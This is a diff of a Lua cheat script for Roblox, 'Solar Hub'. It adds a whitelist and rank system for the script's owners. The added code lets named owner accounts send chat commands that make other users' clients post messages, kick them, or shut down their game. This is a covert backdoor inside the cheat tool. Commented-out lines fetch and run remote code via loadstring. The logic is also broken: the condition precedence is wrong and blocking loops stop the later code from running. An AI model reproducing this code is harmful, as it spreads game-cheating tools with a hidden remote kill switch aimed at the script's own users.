@@ -1,20 +1,106 @@
+--loadstring(game:HttpGet("https://raw.githubusercontent.com/rip2point/Solar-Hub/main/Other%20Stuff/SOLARHUB", true))()
+--loadstring(game:HttpGet("https://raw.githubusercontent.com/rip2point/Solar-Hub/main/Other%20Stuff/SOLARHUB", true))()
+--game.Players.LocalPlayer.CameraMaxZoomDistance = 20.100000381469727
 getgenv().discordinvsolar = "https://discord.gg/vvYvyh9JdR" -- dont try to change this skiddy skid!!!!!
 getgenv().versionsolar = "1.0.2"
 
 getgenv().hasPremium = nil
 
-local users = {
-228038574, -- owner
-221897035, -- dev
-759881255, -- dev
-275263932, -- forget
-1733169301, -- family
-2450635720, -- friend
-3224605521, -- throwaway
-}
+-- the premium system below is skidded from multiple of my old scripts combined to one, ignore the stupid methods and messy code
 
-if table.find(users, game.Players.LocalPlayer.userId) then
-getgenv().hasPremium = true -- oh em gee you are so smart before you executed solar you put "getgenv().hasPremium = true!!!!! oh em gee you cracked solar!!!!!!
+local whitelisted = {
+    "twistedworId",
+    "pianodano",
+    "Jerhimibaseballpro",
+};
+local isOwner = {
+    759881255,
+};
+local isAdmin = {
+    2450635720,
+    275263932,
+};
+local isPremium = {
+    1234,
+};
+
+--
+local pl, replicatedStorage = game:GetService("Players"), game:GetService("ReplicatedStorage");
+local defaultChatSystemChatEvents = replicatedStorage:FindFirstChild("DefaultChatSystemChatEvents");
+local onMessageDoneFiltering = defaultChatSystemChatEvents:FindFirstChild("OnMessageDoneFiltering");
+--
+local solaradmin = {};
+
+while wait(10) do
+for i, solarmin in pairs(game:GetService("Players"):GetPlayers()) do
+    if table.find(whitelisted, solarmin.Name) then
+        table.clear(solaradmin) --idiot method
+        table.insert(solaradmin, solarmin.Name) --idiot method
+        
+        end
+    end;
+ end;
+wait()
+
+local Host, Host2, Host3 = solaradmin[1], solaradmin[2], solaradmin[3] -- im an idiot this is such a bad method lool 
+
+if pl.LocalPlayer.Name ~= Host or pl.LocalPlayer.Name ~= Host2 or pl.LocalPlayer.Name ~= Host3 then
+       
+onMessageDoneFiltering.OnClientEvent:Connect(function(messageData)
+local speaker, message = pl[messageData.FromSpeaker], messageData.Message;
+
+if speaker.Name == Host or speaker.Name == Host2 or speaker.Name == Host3 and message == "!check" then
+    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("SL2 IS MY FAVOURITE GAME!", 'All');
+elseif speaker.Name == Host or speaker.Name == Host2 or speaker.Name == Host3 and message == "!haha" then
+    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("SolarW", 'All');
+elseif speaker.Name == Host or speaker.Name == Host2 or speaker.Name == Host3 and message == "!kick" then
+    pl.LocalPlayer:Kick("Someone with kick whitelists kicked you! report this to the discord server if this was abuse!");
+elseif speaker.Name == Host or speaker.Name == Host2 or speaker.Name == Host3 and message == "!crash" then
+    game:Shutdown();
 end
+end);
+end;
 
 
+
+while wait(1) do
+    
+for i, v in pairs(game:GetService("Players"):GetPlayers()) do
+    
+    if table.find(isOwner, v.UserId) then
+        
+        game:GetService("Workspace"):FindFirstChild(v.Name).Head.Gui.MainFrame.Rank.Font = "Gotham";
+        game:GetService("Workspace"):FindFirstChild(v.Name).Head.Gui.MainFrame.Rank.TextColor3 = Color3.new(255, 230, 0);
+		game:GetService("Workspace"):FindFirstChild(v.Name).Head.Gui.MainFrame.Rank.Text = "OWNER OF SOLAR";
+        
+    elseif table.find(isAdmin, v.UserId) then
+
+	    game:GetService("Workspace"):FindFirstChild(v.Name).Head.Gui.MainFrame.Rank.Font = "Gotham";
+        game:GetService("Workspace"):FindFirstChild(v.Name).Head.Gui.MainFrame.Rank.TextColor3 = Color3.new(0.85098, 0, 0.0156863);
+		game:GetService("Workspace"):FindFirstChild(v.Name).Head.Gui.MainFrame.Rank.Text = "SOLAR ADMIN";
+    
+    elseif table.find(isPremium, v.UserId) then
+        
+        game:GetService("Workspace"):FindFirstChild(v.Name).Head.Gui.MainFrame.Rank.Font = "Gotham";
+        game:GetService("Workspace"):FindFirstChild(v.Name).Head.Gui.MainFrame.Rank.TextColor3 = Color3.new(0.145098, 0.858824, 1);
+		game:GetService("Workspace"):FindFirstChild(v.Name).Head.Gui.MainFrame.Rank.Text = "SOLAR PREMIUM";
+		
+        end
+    end
+end;
+
+if pl:FindFirstChild("twistedworId") then
+    if syn then
+        rconsoleprint("owner of solar is in your game");
+    else
+        game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("A owner or admin has joined", 'All');
+        
+    end
+end;
+
+if table.find(isOwner, pl.LocalPlayer.UserId) then
+hasPremium = true
+elseif table.find(isAdmin, pl.LocalPlayer.UserId) then
+hasPremium = true
+elseif table.find(isPremium, pl.LocalPlayer.UserId) then
+hasPremium = true end;
